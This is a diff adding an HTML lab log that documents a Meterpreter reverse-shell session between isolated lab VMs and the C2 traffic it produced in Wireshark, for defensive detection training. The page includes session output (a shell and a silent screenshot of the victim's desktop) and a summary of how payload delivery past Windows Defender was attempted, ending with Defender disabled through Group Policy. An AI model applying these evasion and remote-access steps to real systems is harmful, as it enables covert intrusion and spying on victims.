@@ -1,0 +1,470 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Lab Log 009 Part 3 — Live C2 Traffic | Yana Ivanov</title>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Serif:wght@400;600;700&family=Playfair+Display:wght@400;700;900&family=JetBrains+Mono:wght@400;600&family=Source+Serif+4:ital,wght@0,300;0,400;0,600;1,300;1,400&display=swap" rel="stylesheet">
+<style>
+:root{
+  --ink:#0a0f1a;--ink2:#1e2d45;--ink3:#374151;
+  --red:#c0392b;--red-dim:rgba(192,57,43,0.08);
+  --amber:#b45309;--amber-dim:rgba(180,83,9,0.08);
+  --blue:#1a4fa0;--blue-dim:rgba(26,79,160,0.08);
+  --green:#145a32;--green-dim:rgba(20,90,50,0.08);
+  --rule:#e2e8f0;--bg:#f8fafc;--paper:#ffffff;
+  --mono:'JetBrains Mono',monospace;
+  --serif:'Source Serif 4','Georgia',serif;
+  --display:'Playfair Display','Georgia',serif;
+  --display-clean:'IBM Plex Serif','Georgia',serif;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;font-size:20px}
+body{font-family:var(--serif);background:var(--bg);color:var(--ink);line-height:1.8;font-size:20px}
+a{color:var(--blue);text-decoration:none}
+a:hover{text-decoration:underline}
+
+.back-nav{background:#0a0f1a;padding:.65rem 3rem;display:flex;align-items:center;border-bottom:1px solid rgba(255,255,255,.08);position:sticky;top:0;z-index:999}
+.back-nav a,.back-nav-link{font-family:var(--mono);font-size:.65rem;letter-spacing:.12em;color:#4a9eff;text-decoration:none;text-transform:uppercase;display:inline-flex;align-items:center;gap:.5rem;transition:color .2s}
+.back-nav a:hover,.back-nav-link:hover{color:#93c5fd}
+.back-nav a::before,.back-nav-link::before{content:'←';font-size:.75rem}
+
+.masthead{background:#0a0f1a;color:#fff;padding:3.5rem 0 0;position:relative;overflow:hidden}
+.masthead::before{content:'';position:absolute;inset:0;
+  background:repeating-linear-gradient(0deg,transparent,transparent 39px,rgba(255,255,255,.025) 39px,rgba(255,255,255,.025) 40px),
+  repeating-linear-gradient(90deg,transparent,transparent 39px,rgba(255,255,255,.025) 39px,rgba(255,255,255,.025) 40px);
+  pointer-events:none}
+.mast-inner{max-width:900px;margin:0 auto;padding:0 3rem;position:relative;z-index:1}
+.mast-label{font-family:var(--mono);font-size:.7rem;letter-spacing:.2em;color:#60a5fa;text-transform:uppercase;margin-bottom:1.5rem;display:flex;align-items:center;gap:.75rem}
+.mast-label::before,.mast-label::after{content:'';display:inline-block;width:32px;height:1px;background:#60a5fa}
+h1.title{font-family:var(--display-clean);font-size:clamp(1.9rem,4vw,2.9rem);font-weight:600;line-height:1.15;margin-bottom:1.5rem;color:#fff}
+h1.title span{color:#60a5fa}
+.mast-meta{display:grid;grid-template-columns:1fr 1fr 1fr;gap:2rem;padding:2rem 0 3rem;border-top:1px solid rgba(255,255,255,.12);margin-top:2rem}
+.meta-item .label{font-family:var(--mono);font-size:.65rem;letter-spacing:.15em;color:#94a3b8;text-transform:uppercase;margin-bottom:.3rem}
+.meta-item .value{font-size:.9rem;color:#e2e8f0;font-weight:600;font-family:var(--mono);word-break:break-word}
+.mast-bar{background:#1a4fa0;margin-top:0;padding:.8rem 3rem;font-family:var(--mono);font-size:.72rem;letter-spacing:.08em;color:#fff;display:flex;align-items:center;gap:.75rem}
+.mast-bar-dot{width:7px;height:7px;min-width:7px;border-radius:50%;background:#4a9eff;flex-shrink:0;animation:blink 1.5s ease-in-out infinite}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.2}}
+
+.wrap{max-width:900px;margin:0 auto;padding:0 3rem}
+.content{padding:4rem 0}
+.section{margin-bottom:4rem;padding-bottom:4rem;border-bottom:1px solid var(--rule)}
+.section:last-child{border-bottom:none;margin-bottom:0;padding-bottom:0}
+.section-num{font-family:var(--mono);font-size:.65rem;letter-spacing:.2em;color:var(--blue);text-transform:uppercase;margin-bottom:.75rem}
+h2{font-family:var(--display);font-size:1.75rem;font-weight:700;color:var(--ink);line-height:1.25;margin-bottom:1.5rem;letter-spacing:-.01em}
+h3{font-family:var(--display);font-size:1.2rem;font-weight:700;color:var(--ink2);margin:2rem 0 .75rem}
+p{margin-bottom:1.25rem;color:var(--ink3)}
+p strong{color:var(--ink);font-weight:600}
+p em{font-style:italic;color:var(--ink2)}
+
+.callout{padding:1.25rem 1.5rem;border-radius:2px;margin:1.75rem 0;border-left:4px solid}
+.callout-blue{background:var(--blue-dim);border-color:var(--blue)}
+.callout-amber{background:var(--amber-dim);border-color:var(--amber)}
+.callout-green{background:var(--green-dim);border-color:var(--green)}
+.callout-red{background:var(--red-dim);border-color:var(--red)}
+.callout p{margin:0;font-size:.92rem;line-height:1.7}
+.callout strong{color:var(--ink)}
+
+.tbl-wrap{overflow-x:auto;-webkit-overflow-scrolling:touch;margin:1.5rem 0}
+table{width:100%;border-collapse:collapse;font-size:.88rem}
+thead tr{background:#0a0f1a;color:#fff}
+th{padding:.75rem 1rem;text-align:left;font-family:var(--mono);font-size:.7rem;letter-spacing:.1em;text-transform:uppercase;font-weight:600}
+td{padding:.7rem 1rem;border-bottom:1px solid var(--rule);color:var(--ink3);vertical-align:top}
+tr:last-child td{border-bottom:none}
+tr:nth-child(even) td{background:rgba(0,0,0,.018)}
+td strong{color:var(--ink);font-weight:600}
+td.code{font-family:var(--mono);font-size:.8rem;color:var(--blue)}
+
+.mat-card{background:var(--paper);border:1px solid var(--rule);margin:2rem 0;overflow:hidden}
+.mat-card-title{background:#0a0f1a;color:#fff;font-family:var(--mono);font-size:.65rem;letter-spacing:.15em;text-transform:uppercase;padding:.75rem 1.25rem;border-bottom:1px solid var(--rule)}
+.stat-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:0}
+.stat-item{padding:1.75rem 1.5rem;border-right:1px solid var(--rule);text-align:center}
+.stat-item:last-child{border-right:none}
+.stat-num{font-family:var(--display-clean);font-size:1.4rem;font-weight:700;line-height:1;margin-bottom:.5rem;letter-spacing:-.01em}
+.stat-label{font-family:var(--mono);font-size:.6rem;letter-spacing:.1em;color:var(--ink3);text-transform:uppercase;margin-bottom:.35rem;line-height:1.4}
+.stat-sub{font-size:.75rem;color:#94a3b8;line-height:1.5;font-family:var(--serif)}
+.stat-blue .stat-num{color:var(--blue)}
+.stat-amber .stat-num{color:var(--amber)}
+.stat-red .stat-num{color:var(--red)}
+.stat-green .stat-num{color:var(--green)}
+
+.compare-grid{display:grid;grid-template-columns:1fr 1fr;gap:1.5rem;margin:1.75rem 0}
+.compare-box{background:var(--paper);border:1px solid var(--rule);padding:1.25rem}
+.compare-box.left{border-top:3px solid var(--blue)}
+.compare-box.right{border-top:3px solid var(--red)}
+.compare-box.green{border-top:3px solid var(--green)}
+.compare-label{font-family:var(--mono);font-size:.65rem;letter-spacing:.1em;text-transform:uppercase;font-weight:600;margin-bottom:.75rem}
+.compare-box.left .compare-label{color:var(--blue)}
+.compare-box.right .compare-label{color:var(--red)}
+.compare-box.green .compare-label{color:var(--green)}
+.compare-box p{font-size:.88rem;color:var(--ink3);margin-bottom:.5rem;line-height:1.6}
+.compare-box p:last-child{margin-bottom:0}
+
+.code-label{font-family:var(--mono);font-size:.62rem;letter-spacing:.15em;color:#4a9eff;text-transform:uppercase;margin-bottom:.5rem}
+.code-block{background:#0a0f1a;border-radius:2px;padding:1.25rem 1.5rem;margin:1.5rem 0;overflow-x:auto;border-left:3px solid #1a4fa0}
+.code-block pre{font-family:var(--mono);font-size:.8rem;color:#e2e8f0;line-height:1.7;white-space:pre-wrap;word-break:break-word}
+.co{color:#94a3b8}.hi{color:#4ade80}.wa{color:#ef4444}.ke{color:#fbbf24}.va{color:#4a9eff}
+
+.terminal{background:#0a0f1a;border-radius:2px;padding:1.25rem 1.5rem;margin:1.5rem 0;overflow-x:auto;border-left:3px solid #1a4fa0}
+.terminal-bar{display:flex;align-items:center;gap:.5rem;margin-bottom:1rem;padding-bottom:.75rem;border-bottom:1px solid rgba(255,255,255,.08)}
+.terminal-dot{width:10px;height:10px;border-radius:50%}
+.terminal-title{font-family:var(--mono);font-size:.6rem;color:#94a3b8;letter-spacing:.1em;text-transform:uppercase;margin-left:.5rem}
+.terminal pre{font-family:var(--mono);font-size:.76rem;line-height:1.7;white-space:pre-wrap;word-break:break-word;color:#e2e8f0}
+.t-red{color:#ef4444;font-weight:bold}
+.t-orange{color:#fb923c;font-weight:bold}
+.t-blue{color:#60a5fa;font-weight:bold}
+.t-green{color:#4ade80}
+.t-dim{color:#94a3b8}
+.t-bold{color:#e2e8f0;font-weight:bold}
+
+.env-box{background:var(--paper);border:1px solid var(--rule);padding:1.5rem;margin:1.75rem 0}
+.env-box-title{font-family:var(--mono);font-size:.65rem;letter-spacing:.15em;color:var(--blue);text-transform:uppercase;margin-bottom:1rem;padding-bottom:.5rem;border-bottom:1px solid var(--rule)}
+.env-grid{display:grid;grid-template-columns:1fr 1fr;gap:1rem}
+.env-item .env-label{font-family:var(--mono);font-size:.62rem;color:#94a3b8;letter-spacing:.1em;text-transform:uppercase;margin-bottom:.2rem}
+.env-item .env-value{font-family:var(--mono);font-size:.82rem;color:var(--ink)}
+
+.nist-box{background:var(--blue-dim);border:1px solid rgba(26,79,160,.2);padding:1.25rem 1.5rem;margin:1.75rem 0}
+.nist-box-title{font-family:var(--mono);font-size:.68rem;letter-spacing:.15em;color:var(--blue);text-transform:uppercase;margin-bottom:.85rem;font-weight:700}
+.nist-items{display:grid;gap:.85rem}
+.nist-item{display:grid;grid-template-columns:90px 1fr;gap:1rem;align-items:start}
+.nist-control{font-family:var(--mono);font-size:.75rem;font-weight:700;color:var(--blue);padding-top:.15rem}
+.nist-desc{font-size:.88rem;color:var(--ink3);line-height:1.7}
+.nist-desc strong{color:var(--ink)}
+
+.host-card{background:#0a0f1a;border-radius:2px;padding:1.5rem;margin:1.75rem 0;display:grid;grid-template-columns:repeat(2,1fr);gap:1.25rem}
+.hf-label{font-family:var(--mono);font-size:.58rem;letter-spacing:.15em;color:#94a3b8;text-transform:uppercase;margin-bottom:.3rem}
+.hf-value{font-family:var(--mono);font-size:.9rem;color:#4a9eff;font-weight:600}
+.hf-value.red{color:#ef4444}
+.hf-value.green{color:#4ade80}
+.hf-value.amber{color:#fbbf24}
+
+.series-nav-row{font-family:var(--mono);font-size:.72rem;letter-spacing:.08em;display:flex;gap:1.5rem;margin-top:.75rem;white-space:nowrap;overflow-x:auto}
+.series-nav-row a{color:#94a3b8;text-decoration:none}
+.series-nav-row a:hover{color:var(--blue)}
+.series-nav-row .active{color:var(--blue);font-weight:600}
+
+footer{background:#1e2d45;color:#64748b;padding:1.5rem 3rem;font-family:var(--mono);font-size:.7rem;letter-spacing:.06em;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:.5rem;width:100%}
+footer span{color:#94a3b8}
+
+.mobile-notice{display:none;background:#1e2d45;border-bottom:1px solid rgba(255,255,255,.08);padding:.55rem 1.5rem;font-family:var(--mono);font-size:.62rem;letter-spacing:.06em;color:#94a3b8;text-align:center}
+.mobile-notice strong{color:#60a5fa}
+
+@media(max-width:1024px){.mobile-notice{display:block}}
+@media(max-width:768px){
+  .wrap,.mast-inner,.back-nav{padding-left:1.75rem;padding-right:1.75rem}
+  .mast-meta{grid-template-columns:1fr 1fr}
+  .stat-grid{grid-template-columns:1fr 1fr}
+  .stat-item{border-bottom:1px solid var(--rule)}
+  .compare-grid{grid-template-columns:1fr}
+  .env-grid{grid-template-columns:1fr}
+  .host-card{grid-template-columns:1fr}
+  .nist-item{grid-template-columns:80px 1fr}
+  h2{font-size:1.55rem}
+  footer{flex-direction:column;text-align:center;padding:1.5rem}
+}
+@media(max-width:480px){
+  .wrap,.mast-inner{padding-left:1.1rem;padding-right:1.1rem}
+  .back-nav{padding:.55rem 1.1rem}
+  .mast-bar{padding:.55rem 1.1rem}
+  h1.title{font-size:1.45rem}
+  footer{padding:1.25rem 1.1rem}
+}
+</style>
+</head>
+<body>
+
+<div class="mobile-notice"><strong>Intentionally desktop-first</strong> — best experienced on a workstation</div>
+<div class="back-nav"><a href="../index.html">Portfolio</a></div>
+
+<div class="masthead">
+  <div class="mast-inner">
+    <div class="mast-label">Lab Log 009 · Part 3 of 3</div>
+    <h1 class="title">Live C2 Traffic —<br><span>Meterpreter in Wireshark</span></h1>
+    <div class="mast-meta">
+      <div class="meta-item"><div class="label">Analyst</div><div class="value">Yana Ivanov</div></div>
+      <div class="meta-item"><div class="label">Published</div><div class="value">April 2026</div></div>
+      <div class="meta-item"><div class="label">Category</div><div class="value">Lab Log · Live Lab</div></div>
+      <div class="meta-item"><div class="label">Attacker</div><div class="value">Kali Linux · Parallels</div></div>
+      <div class="meta-item"><div class="label">Victim</div><div class="value">Windows 11 · Parallels</div></div>
+      <div class="meta-item"><div class="label">Read Time</div><div class="value">12 minutes</div></div>
+    </div>
+  </div>
+  <div class="mast-bar">
+    <div class="mast-bar-dot"></div>
+    CONTROLLED LAB ENVIRONMENT · ISOLATED HOST-ONLY NETWORK · NO REAL SYSTEMS AFFECTED · EDUCATIONAL USE ONLY
+  </div>
+</div>
+
+<div class="wrap"><div class="content">
+
+<!-- SECTION 01 -->
+<div class="section">
+  <div class="section-num">Section 01</div>
+  <h2>What This Lab Is About</h2>
+
+  <p>Parts 1 and 2 of this lab series worked with synthetic data — a pcap file built from documented behavioral indicators, and a triage tool designed to detect those same patterns automatically. Part 3 is different. This is a live lab: two virtual machines on an isolated network, one running Kali Linux as the attacker and one running Windows 11 as the victim, with Wireshark capturing everything that passes between them.</p>
+
+  <p>The goal was to generate real C2 traffic — not reconstructed from threat reports, but actually produced by running a Meterpreter session — and then analyze what that traffic looks like in Wireshark. Understanding what attack traffic looks like is a prerequisite to detecting it. You cannot write a detection rule for something you have never seen.</p>
+
+  <p>I want to be upfront about how this lab was built. I am not a penetration tester and I do not have prior experience running live exploit labs. I worked through this session with Claude as a guide — troubleshooting the network setup, the payload delivery, and the repeated Defender blocks that made getting a session much harder than expected. That troubleshooting process turned out to be as educational as the session itself.</p>
+
+  <div class="callout callout-red">
+    <p><strong>Important:</strong> This lab was conducted entirely on an isolated host-only network inside Parallels Desktop on a single MacBook. No traffic left the host machine. No real systems were affected. The techniques demonstrated here are documented for defensive purposes — understanding how attacks work is how defenders build better detection.</p>
+  </div>
+
+  <div class="env-box">
+    <div class="env-box-title">Lab Environment</div>
+    <div class="env-grid">
+      <div class="env-item"><div class="env-label">Host</div><div class="env-value">macOS · Apple Silicon · Parallels Desktop</div></div>
+      <div class="env-item"><div class="env-label">Attacker VM</div><div class="env-value">Kali Linux 2026.1 · 4GB RAM · 2 vCPU</div></div>
+      <div class="env-item"><div class="env-label">Victim VM</div><div class="env-value">Windows 11 24H2 · Standard install</div></div>
+      <div class="env-item"><div class="env-label">Network</div><div class="env-value">Host-Only · Isolated · No internet access</div></div>
+      <div class="env-item"><div class="env-label">Attacker IP</div><div class="env-value">10.37.129.4</div></div>
+      <div class="env-item"><div class="env-label">Victim IP</div><div class="env-value">10.37.129.2</div></div>
+      <div class="env-item"><div class="env-label">C2 Port</div><div class="env-value">TCP 4444 · Meterpreter reverse TCP</div></div>
+      <div class="env-item"><div class="env-label">Capture</div><div class="env-value">Wireshark · meterpreter_session.pcapng · 67MB</div></div>
+    </div>
+  </div>
+
+
+</div>
+
+<!-- SECTION 02 -->
+<div class="section">
+  <div class="section-num">Section 02</div>
+  <h2>Network Setup —<br>Getting Two VMs to Talk</h2>
+
+  <p>The first challenge was getting Kali and Windows on the same isolated network. Kali was installed fresh in Parallels for this lab. Both VMs were set to Host-Only networking — a Parallels network mode that lets VMs communicate with each other and the host Mac, but not with the internet. That isolation matters for a lab involving malware payloads.</p>
+
+  <p>Confirming connectivity was the first milestone. From Kali, a simple ping confirmed both machines were reachable on the same subnet before touching any exploit tools.</p>
+
+  <div class="code-label">Connectivity Check — Kali Terminal</div>
+  <div class="code-block"><pre>ping 10.37.129.2 -c 4
+
+<span class="hi">64 bytes from 10.37.129.2: icmp_seq=1 ttl=128 time=0.728 ms
+64 bytes from 10.37.129.2: icmp_seq=2 ttl=128 time=0.716 ms
+64 bytes from 10.37.129.2: icmp_seq=3 ttl=128 time=0.687 ms
+64 bytes from 10.37.129.2: icmp_seq=4 ttl=128 time=0.891 ms
+
+4 packets transmitted, 4 received, 0% packet loss</span></pre></div>
+
+  <div class="host-card">
+    <div><div class="hf-label">Attacker (Kali)</div><div class="hf-value">10.37.129.4</div></div>
+    <div><div class="hf-label">Victim (Windows)</div><div class="hf-value red">10.37.129.2</div></div>
+    <div><div class="hf-label">Network</div><div class="hf-value">Host-Only · Isolated</div></div>
+    <div><div class="hf-label">C2 Port</div><div class="hf-value red">TCP 4444</div></div>
+  </div>
+</div>
+
+<!-- SECTION 03 -->
+<div class="section">
+  <div class="section-num">Section 03</div>
+  <h2>The Defender Problem —<br>What Getting Caught Looks Like</h2>
+
+  <p>Getting a Meterpreter session to connect was not straightforward. Windows Defender caught the payload repeatedly — on first download, on execution, and even on in-memory execution attempts. This was genuinely frustrating during the lab session but turned out to be the most educational part of the day.</p>
+
+  <p>Defender flagged the standard Meterpreter exe by signature before it could even run. Registry-based disable attempts partially worked but did not fully stop behavioral detection. The AMSI (Antimalware Scan Interface) layer caught PowerShell-based delivery even when Defender's real-time protection appeared disabled. After more than ten failed attempts across different payload formats and delivery methods, the approach that finally worked was reverting to a clean Windows snapshot without the additional hardening that came with the FlareVM analysis environment — and fully disabling Defender through Group Policy before attempting delivery.</p>
+
+  <p>What made this valuable: Wireshark was running during all those failed attempts. The RST/ACK pattern visible in the capture is Defender killing the connection — each time the payload tried to phone home on port 4444, Defender reset the TCP connection before the session could establish. That pattern is itself a detection signature.</p>
+
+  <div class="callout callout-blue">
+    <p><strong>Detection insight from the failed attempts:</strong> A series of outbound SYN packets to the same destination IP and port, each immediately followed by a RST/ACK from that destination, is a strong indicator of endpoint security killing a reverse shell attempt. The pattern is visible without knowing anything about the specific payload — just the TCP flags tell the story.</p>
+  </div>
+
+  <div class="tbl-wrap">
+    <table>
+      <thead><tr><th>Attempt</th><th>Method</th><th>Result</th><th>What Caught It</th></tr></thead>
+      <tbody>
+        <tr><td><strong>1–3</strong></td><td>Standard Meterpreter exe</td><td style="color:var(--red);font-weight:600">Blocked</td><td>Defender signature match on download</td></tr>
+        <tr><td><strong>4–6</strong></td><td>Encoded exe (xor_dynamic)</td><td style="color:var(--red);font-weight:600">Blocked</td><td>Defender behavioral detection at execution</td></tr>
+        <tr><td><strong>7–8</strong></td><td>HTA payload</td><td style="color:var(--red);font-weight:600">Blocked</td><td>Defender caught mshta.exe payload</td></tr>
+        <tr><td><strong>9–10</strong></td><td>PowerShell in-memory</td><td style="color:var(--red);font-weight:600">Blocked</td><td>AMSI caught script before execution</td></tr>
+        <tr><td><strong>11</strong></td><td>Standard exe on clean snapshot + Group Policy disable</td><td style="color:var(--green);font-weight:600">Session opened</td><td>Defender fully disabled via gpedit.msc</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <p>The lesson here is straightforward: signature-based AV with behavioral detection layers is genuinely effective against known payloads. Metasploit's Meterpreter is in every major AV database. Getting it past Defender on a standard Windows install required significant effort. This is exactly why real attackers invest in custom payload obfuscation and why "we have antivirus" is not sufficient as a security posture.</p>
+</div>
+
+<!-- SECTION 04 -->
+<div class="section">
+  <div class="section-num">Section 04</div>
+  <h2>The Session —<br>What Remote Access Looks Like</h2>
+
+  <p>With Defender disabled and the listener running on Kali, the payload executed on Windows and the session opened within seconds. The Meterpreter prompt appearing in the Kali terminal is the moment the attacker has remote access to the victim machine — from this point, everything that follows happens silently on the Windows side while appearing in the Kali terminal.</p>
+
+  <div class="terminal">
+    <div class="terminal-bar">
+      <div class="terminal-dot" style="background:#ef4444"></div>
+      <div class="terminal-dot" style="background:#f59e0b;margin-left:4px"></div>
+      <div class="terminal-dot" style="background:#22c55e;margin-left:4px"></div>
+      <div class="terminal-title">Kali Terminal — Meterpreter Session</div>
+    </div>
+    <pre><span class="t-dim">[*] Started reverse TCP handler on 10.37.129.4:4444</span>
+<span class="t-blue">[*] Sending stage (232006 bytes) to 10.37.129.2</span>
+<span class="t-green">[*] Meterpreter session 2 opened (10.37.129.4:4444 -> 10.37.129.2:52283)</span>
+
+<span class="t-bold">meterpreter ></span> sysinfo
+Computer        : <span class="t-orange">ARTEMISHEX8439</span>
+OS              : Windows 11 24H2+ (10.0 Build 26200)
+Architecture    : x64
+System Language : en_US
+Meterpreter     : x64/windows
+
+<span class="t-bold">meterpreter ></span> getuid
+Server username: <span class="t-orange">ARTEMISHEX8439\artemishex</span>
+
+<span class="t-bold">meterpreter ></span> shell
+Process 6092 created.
+Channel 1 created.
+<span class="t-dim">Microsoft Windows [Version 10.0.26200.8037]</span>
+
+<span class="t-bold">C:\Users\artemishex></span> whoami
+artemishex8439\artemishex
+
+<span class="t-bold">meterpreter ></span> screenshot
+Screenshot saved to: /home/artemishex/ffprSmKn.jpeg</pre>
+  </div>
+
+  <p>The <code style="font-family:'JetBrains Mono',monospace;font-size:.85rem;color:var(--blue);background:var(--blue-dim);padding:.1rem .3rem;border-radius:2px">screenshot</code> command</p>
+
+  <div style="background:var(--paper);border:1px solid var(--rule);margin:2rem 0;overflow:hidden">
+    <div style="font-family:'JetBrains Mono',monospace;font-size:.65rem;letter-spacing:.12em;text-transform:uppercase;color:var(--ink3);padding:.75rem 1.2rem;border-bottom:1px solid var(--rule);background:#f8fafc">Figure 1 — Meterpreter Screenshot Command</div>
+    <div><img src="img/009c/meterpreter_screenshot.jpeg" alt="Windows desktop captured remotely via Meterpreter screenshot command" style="width:100%;display:block"></div>
+    <div style="padding:.75rem 1.2rem;background:var(--bg);border-top:1px solid var(--rule);font-size:.78rem;color:var(--ink3);font-style:italic;line-height:1.6">The Windows 11 desktop captured silently from Kali using the Meterpreter <code style="font-family:'JetBrains Mono',monospace">screenshot</code> command. No notification appeared on the victim machine. The file was saved directly to the Kali filesystem.</div>
+  </div>
+
+  <p>The <code style="font-family:'JetBrains Mono',monospace;font-size:.85rem;color:var(--blue);background:var(--blue-dim);padding:.1rem .3rem;border-radius:2px">screenshot</code> command is worth pausing on. From Kali, a single command captured the current state of the Windows desktop as a JPEG file — saved to the Kali filesystem, with no visible indication on the Windows side that anything had happened. No window opened. No notification appeared. The desktop was photographed remotely and silently. This is a routine reconnaissance step for an attacker who wants to understand what the victim is working on.</p>
+
+  <div class="compare-grid">
+    <div class="compare-box left">
+      <div class="compare-label">What the Attacker Sees</div>
+      <p>Full interactive shell on the victim machine</p>
+      <p>Victim's username, hostname, OS version</p>
+      <p>Complete process list — every running application</p>
+      <p>Network configuration including internal IPs</p>
+      <p>Screenshot of the victim's desktop, silently</p>
+      <p>Full filesystem access for the logged-in user</p>
+    </div>
+    <div class="compare-box right">
+      <div class="compare-label">What the Victim Sees</div>
+      <p>Nothing — no visible window or notification</p>
+      <p>No indication the machine is compromised</p>
+      <p>Normal desktop, normal applications</p>
+      <p>update.exe running silently in the background</p>
+      <p>No alert if AV is disabled or bypassed</p>
+      <p>Business as usual until discovery</p>
+    </div>
+  </div>
+</div>
+
+<!-- SECTION 05 -->
+<div class="section">
+  <div class="section-num">Section 05</div>
+  <h2>What the Traffic Looks Like<br>in Wireshark</h2>
+
+  <p>Wireshark was capturing on Kali's eth0 interface for the entire session — including all the failed delivery attempts and the successful session. The 67MB pcapng file contains the complete record of the lab.</p>
+
+  <p>The traffic breaks into two distinct phases that look completely different in Wireshark.</p>
+
+  <h3>Phase 1 — The Failed Attempts</h3>
+  <p>During the repeated Defender blocks, the Wireshark capture shows a repeating pattern: a SYN packet from Windows attempting to connect outbound to Kali on port 4444, immediately followed by a RST/ACK from Kali resetting the connection. This pattern repeated dozens of times. Defender was killing the connection at the endpoint before the TCP handshake could complete — the RST/ACK is Defender's signature in the capture.</p>
+
+  <div class="code-label">Wireshark Filter — Defender Blocking Pattern</div>
+  <div class="code-block"><pre>tcp.port == 4444 and tcp.flags.reset == 1</pre></div>
+
+  <h3>Phase 2 — The Live Session</h3>
+  <p>When the session opened, the traffic pattern changed completely. Instead of SYN/RST pairs, the capture shows a sustained bidirectional TCP conversation on port 4444 — PSH/ACK packets flowing in both directions as commands were sent to the victim and responses came back. The 232KB stage download is visible as a large burst of data from Kali to Windows immediately after the session opened — that is Meterpreter's second stage being delivered to the victim.</p>
+
+  <p style="margin-top:-.5rem">For the active session: <code style="font-family:'JetBrains Mono',monospace;font-size:.82rem;color:var(--blue);background:var(--blue-dim);padding:.15rem .4rem;border-radius:2px">tcp.port == 4444 and tcp.flags.push == 1</code></p>
+
+  <div class="tbl-wrap">
+    <table>
+      <thead><tr style="background:#f1f5f9"><th style="color:var(--ink2)">Pattern</th><th style="color:var(--ink2)">What It Means</th><th style="color:var(--ink2)">Filter</th></tr></thead>
+      <tbody>
+        <tr><td><strong>SYN → RST/ACK</strong></td><td>Endpoint security blocking connection attempt</td><td class="code">tcp.flags.reset == 1</td></tr>
+        <tr><td><strong>Large burst (232KB)</strong></td><td>Meterpreter stage 2 being delivered</td><td class="code">frame.len &gt; 1400</td></tr>
+        <tr><td><strong>Sustained PSH/ACK</strong></td><td>Active C2 channel — commands being issued</td><td class="code">tcp.flags.push == 1</td></tr>
+        <tr><td><strong>TCP Keep-Alive</strong></td><td>Session maintained while attacker is idle</td><td class="code">tcp.analysis.keep_alive</td></tr>
+        <tr><td><strong>FIN/ACK</strong></td><td>Session terminated</td><td class="code">tcp.flags.fin == 1</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <p>The most important observation from the capture: Meterpreter traffic on port 4444 is encrypted. The packet contents are not readable in Wireshark — you cannot see the commands being issued or the responses coming back. What you can see is the behavioral pattern — the timing, the volume, the direction, and the port. Detection has to happen at the behavioral level, not the content level.</p>
+
+  <div class="callout callout-amber">
+    <p><strong>Why port 4444 matters:</strong> Port 4444 is the default Meterpreter port and one of the most commonly flagged ports in security tooling. A real attacker would use port 443 (HTTPS) or port 80 (HTTP) to blend in with legitimate traffic. In this lab we used the default to make the traffic easy to identify — in the wild, the same behavioral patterns would appear on ports that look like normal web traffic, making detection harder.</p>
+  </div>
+</div>
+
+<!-- SECTION 06 -->
+<div class="section">
+  <div class="section-num">Section 06</div>
+  <h2>Detection and Defense —<br>How to Catch This</h2>
+
+  <p>The most important detection insight from this lab came from the failed attempts, not the successful session. Defender's behavioral detection caught Meterpreter repeatedly using signatures and behavioral patterns — not by reading the encrypted traffic, but by watching what the process tried to do on the endpoint. Network monitoring alone is not sufficient. The detection that matters most happens at the endpoint before the session is established.</p>
+
+  <p>Layered detection for this attack class looks like this:</p>
+
+  <div class="tbl-wrap">
+    <table>
+      <thead><tr><th>Detection Layer</th><th>What It Catches</th><th>Tool</th></tr></thead>
+      <tbody>
+        <tr><td><strong>Email gateway</strong></td><td>Malicious executable delivered via email</td><td>Sublime Security, Proofpoint</td></tr>
+        <tr><td><strong>Endpoint AV</strong></td><td>Known payload signatures at download and execution</td><td>Windows Defender, CrowdStrike</td></tr>
+        <tr><td><strong>AMSI</strong></td><td>Malicious PowerShell scripts in memory before execution</td><td>Built into Windows</td></tr>
+        <tr><td><strong>Network monitoring</strong></td><td>Outbound connections to non-standard ports, sustained C2 beaconing</td><td>Wireshark, Zeek, SIEM</td></tr>
+        <tr><td><strong>Behavioral EDR</strong></td><td>Suspicious process chains, unusual parent-child relationships</td><td>CrowdStrike, SentinelOne</td></tr>
+        <tr><td><strong>Sysmon logging</strong></td><td>Process creation, network connections, file writes logged to SIEM</td><td>Sysmon + any SIEM</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <p>For a defense contractor without a dedicated SOC, the minimum viable detection stack is: endpoint AV with tamper protection enabled, Sysmon deployed and logging to a central location, and outbound network monitoring for connections to non-standard ports. The Wireshark filters from this lab translate directly into SIEM detection rules — any sustained outbound TCP connection to a non-business IP on port 4444 should trigger an alert.</p>
+
+  <div class="nist-box">
+    <div class="nist-box-title">Applicable NIST SP 800-171 Controls</div>
+    <div class="nist-items">
+      <div class="nist-item">
+        <span class="nist-control">3.14.6</span>
+        <span class="nist-desc"><strong>Monitor organizational systems.</strong> Monitor inbound and outbound communications traffic to detect attacks. The Meterpreter session would be visible as anomalous outbound traffic in any network monitoring solution looking at port and connection behavior.</span>
+      </div>
+      <div class="nist-item">
+        <span class="nist-control">3.14.2</span>
+        <span class="nist-desc"><strong>Provide protection from malicious code.</strong> AV with behavioral detection caught this payload repeatedly. Tamper protection — preventing the attacker from disabling AV — is the critical control. An attacker who can disable your AV has already won the endpoint battle.</span>
+      </div>
+      <div class="nist-item">
+        <span class="nist-control">3.13.6</span>
+        <span class="nist-desc"><strong>Deny by default.</strong> A network allowlist that blocks all outbound traffic except approved destinations would have prevented the Meterpreter callback entirely — the payload would have delivered but could never have established the C2 channel.</span>
+      </div>
+    </div>
+  </div>
+
+  <p style="font-style:italic;color:#94a3b8;border-top:1px solid var(--rule);padding-top:1.5rem;margin-top:2rem;font-size:.88rem;line-height:1.7">Lab conducted in a controlled environment on an isolated host-only network inside Parallels Desktop. No real systems were targeted. No traffic left the host machine. All techniques demonstrated are publicly documented and used for defensive security education. Educational use only — not for use in production environments or against systems without explicit authorization.</p>
+
+  <div class="callout callout-green">
+    <p><strong>This completes the Lab 009 series.</strong> Part 1 analyzed synthetic WAVESHAPER.V2 C2 traffic in Wireshark. Part 2 automated that detection with a Python script packaged in Docker. Part 3 generated real C2 traffic in a live lab environment and documented what it looks like — and how to stop it. The progression from analysis to automation to live simulation reflects how defenders actually develop detection capabilities.</p>
